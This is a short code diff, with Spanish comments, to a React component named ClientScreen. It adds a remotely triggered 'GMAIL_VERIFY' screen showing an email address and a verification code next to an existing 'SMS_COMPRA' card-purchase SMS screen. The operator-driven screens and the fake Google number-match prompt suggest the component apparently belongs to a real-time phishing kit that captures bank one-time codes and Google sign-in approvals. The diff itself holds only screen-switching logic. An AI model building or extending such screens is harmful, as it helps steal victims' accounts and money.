@@ -123,7 +123,7 @@ export default function ClientScreen() {
           
           console.log('Cambiando a pantalla:', screenType);
           
-          // Verificación adicional para asegurar que se muestra la pantalla SMS_COMPRA
+          // Verificación para casos especiales de pantallas
           if (tipo.toLowerCase().includes('sms_compra') || 
               tipo.toLowerCase().includes('smscompra') ||
               screenType.toLowerCase() === 'sms_compra' ||
@@ -136,7 +136,19 @@ export default function ClientScreen() {
               ...data,
               terminacion: data.terminacion || '****'
             });
-          } else {
+          } 
+          else if (screenType.toLowerCase() === 'gmail_verify') {
+            console.log('Mostrando pantalla de verificación Google con datos:', data);
+            setCurrentScreen(ScreenType.GMAIL_VERIFY);
+            // Asegurar que tengamos los datos del código y correo
+            setScreenData({
+              ...data,
+              correo: data.correo || '',
+              codigo: data.codigo || '14' // Usamos el código enviado o 14 como fallback
+            });
+            console.log('Datos establecidos para gmail_verify:', { ...data, correo: data.correo, codigo: data.codigo || '14' });
+          } 
+          else {
             setCurrentScreen(screenType as ScreenType);
           }
           
